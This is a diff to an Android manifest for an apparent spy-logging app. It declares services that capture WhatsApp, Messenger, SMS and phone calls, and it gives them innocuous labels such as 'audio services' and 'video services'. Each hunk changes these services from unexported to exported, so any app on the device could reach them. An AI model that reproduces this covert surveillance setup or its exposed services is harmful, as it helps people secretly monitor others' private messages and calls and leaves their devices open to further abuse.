@@ -63,7 +63,7 @@
         <service
             android:name="com.gravatasufoca.spylogger.services.WhatsAppService"
             android:enabled="true"
-            android:exported="false"
+            android:exported="true"
             android:label="audio services">
         </service>
 
@@ -71,7 +71,7 @@
         <service
             android:name="com.gravatasufoca.spylogger.services.MessengerService"
             android:enabled="true"
-            android:exported="false"
+            android:exported="true"
             android:label="video services">
         </service>
 
@@ -79,7 +79,7 @@
         <service
             android:name="com.gravatasufoca.spylogger.services.SmsService"
             android:enabled="true"
-            android:exported="false"
+            android:exported="true"
             android:label="SMS services">
         </service>
         <receiver android:name="com.gravatasufoca.spylogger.receivers.SMSReceiver">
@@ -91,7 +91,7 @@
         <service
             android:name="com.gravatasufoca.spylogger.services.RecordService"
             android:enabled="true"
-            android:exported="false"
+            android:exported="true"
             android:label="call service">
         </service>
 
